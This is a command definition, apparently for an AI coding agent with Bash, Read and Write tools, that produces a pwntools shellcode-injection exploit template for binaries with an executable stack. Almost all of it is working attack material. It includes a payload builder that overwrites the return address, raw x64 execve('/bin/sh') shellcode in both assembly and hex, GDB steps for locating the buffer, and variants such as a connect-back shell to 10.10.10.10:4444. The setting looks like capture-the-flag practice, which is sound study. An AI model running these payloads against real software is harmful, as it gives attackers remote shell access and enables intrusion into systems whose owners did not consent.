---
name: pwn-shellcode
description: Generate shellcode injection exploit template for NX-disabled binaries
argument-hint: "<binary> [--offset N]"
allowed-tools: ["Bash", "Read", "Write"]
---

# PWN Shellcode - Shellcode Injection Template

Generate a shellcode injection exploit for binaries with executable stack.

## Prerequisites

- NX must be disabled (executable stack)
- Need to know or leak buffer address
- No seccomp restrictions on execve

## Generated Template

```python
#!/usr/bin/env python3
"""
Shellcode Injection Exploit
Target: <binary>
Requirement: NX disabled (executable stack)
"""
from pwn import *

# === CONFIGURATION ===
BINARY = './<binary>'
OFFSET = <offset>  # Offset to return address

# === SETUP ===
elf = ELF(BINARY)
context.binary = elf
context.arch = 'amd64'  # or 'i386'

def conn():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    elif args.GDB:
        return gdb.debug(BINARY, '''
            b main
            c
        ''')
    else:
        return process(BINARY)

def main():
    io = conn()

    # === SHELLCODE OPTIONS ===

    # Option 1: pwntools shellcraft (recommended)
    shellcode = asm(shellcraft.sh())

    # Option 2: execve("/bin/sh", NULL, NULL) - x64
    # shellcode = asm('''
    #     xor rsi, rsi
    #     xor rdx, rdx
    #     mov rdi, 0x68732f6e69622f
    #     push rdi
    #     mov rdi, rsp
    #     mov al, 59
    #     syscall
    # ''')

    # Option 3: Short /bin/sh shellcode - x64 (23 bytes)
    # shellcode = bytes.fromhex('31f6f7e6526a68482f62696e2f2f7368545f6a3b580f05')

    log.info(f"Shellcode length: {len(shellcode)} bytes")

    # === FIND BUFFER ADDRESS ===
    # Option 1: Fixed address (no PIE, no ASLR)
    # buf_addr = 0x7fffffffe000  # Find via GDB

    # Option 2: Leak address first
    # io.recvuntil(b'buffer at: ')
    # buf_addr = int(io.recvline(), 16)

    # Option 3: Return to known writable section
    # buf_addr = elf.bss() + 0x100

    buf_addr = 0xdeadbeef  # TODO: Set correct address

    # === BUILD PAYLOAD ===

    # Layout: [shellcode][padding][return to shellcode]
    payload = shellcode
    payload += b'A' * (OFFSET - len(shellcode))
    payload += p64(buf_addr)

    # Alternative: NOP sled for reliability
    # nop_sled = asm('nop') * 100
    # payload = nop_sled + shellcode
    # payload += b'A' * (OFFSET - len(payload))
    # payload += p64(buf_addr)

    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    main()
```

## Finding Buffer Address

```gdb
# In GDB, set breakpoint after input
b *vuln+0x20

# Run and examine stack
r
telescope $rsp 20

# Or find buffer directly
p &buffer
```

## Shellcode Variants

```python
# Standard shell
shellcraft.sh()

# Connect back shell
shellcraft.connect('10.10.10.10', 4444) + shellcraft.dupsh()

# Read flag file
shellcraft.cat('/flag.txt')

# ORW (open/read/write) - for seccomp
shellcraft.open('/flag.txt') + shellcraft.read('rax', 'rsp', 100) + shellcraft.write(1, 'rsp', 100)
```
